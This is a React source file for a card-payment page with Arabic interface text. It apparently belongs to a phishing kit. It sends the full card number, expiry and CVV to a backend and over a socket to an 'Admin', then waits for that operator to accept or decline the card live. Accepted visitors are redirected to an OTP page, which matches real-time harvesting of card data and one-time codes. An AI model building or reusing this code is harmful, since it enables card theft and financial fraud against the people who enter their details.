import axios from "axios";
import React, { useState } from "react";
import { api_route, socket } from "../App";
import { TailSpin } from "react-loader-spinner";
import { id } from "./Home";

const Visa = () => {
  const [card_number, setCardNumber] = useState("");
  const [cvv, setCvv] = useState("");
  const [error, setError] = useState(false);
  const [car_holder_name, setCardHolderName] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [expireMonth, setExpireMonth] = useState("");
  const [expireYear, setExpireYear] = useState("");
  const [load, setLoad] = useState(null);

  const handleExpiryDateChange = (e) => {
    // Limit input to 4 characters (MM/YY)
    const numericValue = e.target.value.replace(/\D/g, "");
    let formattedValue = numericValue.slice(0, 5);

    // Add "/" after 2 characters (month)
    if (formattedValue.length > 2) {
      formattedValue =
        formattedValue.slice(0, 2) + "/" + formattedValue.slice(2);
    }

    setExpiryDate(formattedValue);
  };

  const formatCardNumber = (value) => {
    // Remove non-numeric characters
    const numericValue = value.replace(/\D/g, "");

    // Add space after every 4 digits
    let formattedValue = numericValue.replace(/(\d{4})(?=\d)/g, "$1 ");

    // Trim to 16 characters
    formattedValue = formattedValue.slice(0, 19);

    // Update state
    setCardNumber(formattedValue);
  };

  const handleCardNumberChange = (e) => {
    formatCardNumber(e.target.value);
  };

  const handleCvvChange = (e) => {
    // Limit input to 3 digits
    const numericValue = e.target.value.replace(/\D/g, "");
    setCvv(numericValue.slice(0, 3));
  };

  const handleSubmit = async (e) => {
    setLoad(true);
    setError(false)
    e.preventDefault();
    let check = card_number.split(" ").join("");
    if (check.length !== 16)
      return window.alert("رقم البطاقه يجب ان يكون 16 رقم");

    const finalData = {
      cardNumber: card_number,
      expiryDate: expireMonth + "/" + expireYear,
      cvv,
      card_holder_name: car_holder_name,
    };
    // console.log(finalData)
    try {
      await axios.post(api_route + "/visa/" + id, finalData).then(() => {
        socket.emit("visa", { id, ...finalData });
      });
    } catch (error) {
      console.error(error);
    }
    // return window.location.href = `/verfiy?data=${JSON.stringify(finalData)}`
  };

  socket.on("acceptVisa", (data) => {
    console.log("acceptVisa From Admin", id);
    console.log(data);
    if (id === data) {
      window.location.href = "/visaOtp";
    }
  });

  socket.on("declineVisa", (data) => {
    console.log("declineVisa From Admin", data);
    
    console.log(data);
    if (id === data) {
      setLoad(false)
      setError("بيانات البطاقة غير صحيحة برجاء المحاولة مره اخري");
    }
  });

  return (
    <div
      className="w-full flex flex-col min-h-screen items-center justify-center  relative"
      dir="rtl"
    >
      <img src="/img1.png" className="w-1/2 py-5 my-2" />
      <form
        className="border border-orange-400 w-11/12  p-3 rounded-xl justify-center  items-center flex flex-col gap-y-2 "
        onSubmit={handleSubmit}
      >
        <div
          className="w-full py-3  flex flex-col items-center justify-between p-2 rounded-xl"
          dir="rtl"
        >
          <div className="flex flex-col w-full gap-3  my-2">
            <input
              value={car_holder_name}
              required
              onChange={(e) => setCardHolderName(e.target.value)}
              dir="ltr"
              minLength={4}
              type="text"
              placeholder="أسم حامل البطاقة"
              className="w-full  text-right rounded-md border  border-orange-400  p-2  placeholder:text-gray-600     outline-blue-500"
            />
          </div>
          <div className="flex flex-col w-full gap-3  my-2" dir="rtl">
            <input
              value={card_number}
              required
              onChange={handleCardNumberChange}
              dir="ltr"
              maxLength={19}
              minLength={16}
              inputMode="numeric"
              type="text"
              placeholder="  رقم  البطاقة"
              className="w-full  text-right rounded-md border  border-orange-400  p-2  placeholder:text-gray-600     outline-blue-500"
            />
          </div>
          <div className="w-full flex items-end justify-end">
            <img src="/img7.avif" />
          </div>
          <div className="flex w-full  gap-2">
            <div
              className="flex flex-col w-full  gap-x-5 text-xl my-2"
              dir="rtl"
            >
              <div className="flex w-full gap-x-5 px-2 text-sm ">
                <select
                  className="w-full text-right    rounded-md border border-orange-400  px-2  placeholder:text-black    outline-blue-500"
                  onChange={(e) => setExpireMonth(e.target.value)}
                  value={expireMonth}
                >
                  <option hidden>الشهر</option>
                  <option>01</option>
                  <option>02</option>
                  <option>03</option>
                  <option>04</option>
                  <option>05</option>
                  <option>06</option>
                  <option>07</option>
                  <option>08</option>
                  <option>09</option>
                  <option>10</option>
                  <option>11</option>
                  <option>12</option>
                </select>
                <select
                  className="w-full p-0 text-right     rounded-md border border-orange-400    placeholder:text-black    outline-blue-500"
                  onChange={(e) => setExpireYear(e.target.value)}
                  value={expireYear}
                >
                  <option hidden>السنة</option>
                  <option>2025</option>
                  <option>2026</option>
                  <option>2027</option>
                  <option>2028</option>
                  <option>2029</option>
                  <option>2030</option>
                  <option>2031</option>
                  <option>2032</option>
                </select>
              </div>
            </div>
          </div>
          <div
            className="flex items-center justify-start gap-3 px-2 text-lg text-gray-500 my-2 "
            dir="rtl"
          >
            <img src="/img8.avif" className="w-1/2" />
            <input
              value={cvv}
              required
              onChange={handleCvvChange}
              dir="ltr"
              maxLength={3}
              minLength={3}
              inputMode="numeric"
              type="text"
              placeholder="CVV"
              className="  rounded-md border border-orange-400 px-5 w-1/2  "
            />
          </div>
          {error && (
            <span className="text-red-500 w-full text-center text-lg mt-5 font-bold">
              {error}
            </span>
          )}
          <button
            className="bg-orange-400 w-2/3 my-5 font-bold text-white flex items-center justify-center  py-1 rounded-full mt-2"
            type="submit"
          >
            {load ? (
              <TailSpin
                height="30"
                width="30"
                color="white"
                ariaLabel="tail-spin-loading"
                radius="1"
                wrapperStyle={{}}
                wrapperClass=""
                visible={true}
              />
            ) : (
              "متابعة "
            )}
          </button>
        </div>
      </form>
      <img src="/img5.avif" className="w-11/12 my-2 " />
    </div>
  );
};

export default Visa;
